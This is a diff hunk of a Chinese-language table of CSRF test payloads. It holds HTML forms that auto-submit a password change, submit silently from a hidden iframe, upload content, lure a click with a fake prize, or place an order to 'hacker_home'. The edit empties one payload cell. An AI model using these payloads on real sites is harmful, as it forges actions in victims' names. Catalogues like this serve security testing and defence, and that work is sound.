@@ -599,7 +599,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | :--- | :--- | :--- | :--- | :--- | :--- |
 | CSRF-009 | POST | 自动提交表单 (Auto-Submit) | method: POST, type: form, no_token | `<html><body onload="document.forms[0].submit()"><form action="http://target.com/pass/change" method="POST"><input type="hidden" name="pass" value="123456"></form></body></html>` | 密码被修改 |
 | CSRF-010 | POST | 隐藏 Iframe 内提交 | method: POST, ui: stealth | `<iframe style="display:none" onload="this.contentDocument.forms[0].submit()" srcdoc="<form action='...' method='POST'>...</form>"></iframe>` | 无感修改 |
-| CSRF-011 | POST | Multipart 表单上传 | method: POST, type: multipart | `<form action="http://target.com/upload" method="POST" enctype="multipart/form-data"><input type="hidden" name="content" value="hacked"></form>` | 文件/内容上传成功 |
+| CSRF-011 | POST | Multipart 表单上传 | method: POST, type: multipart | `` | 文件/内容上传成功 |
 | CSRF-012 | POST | 模拟点击提交 | method: POST, interaction: required | `<form action="..." method="POST"><input type="submit" value="Win iPhone"></form>` | 点击按钮后提交 |
 | CSRF-013 | POST | 多参数复杂表单 | method: POST, complexity: high | `<form action="http://shop.com/buy" method="POST"><input name="item" value="1"><input name="addr" value="hacker_home"></form>` | 订单生成 |
 
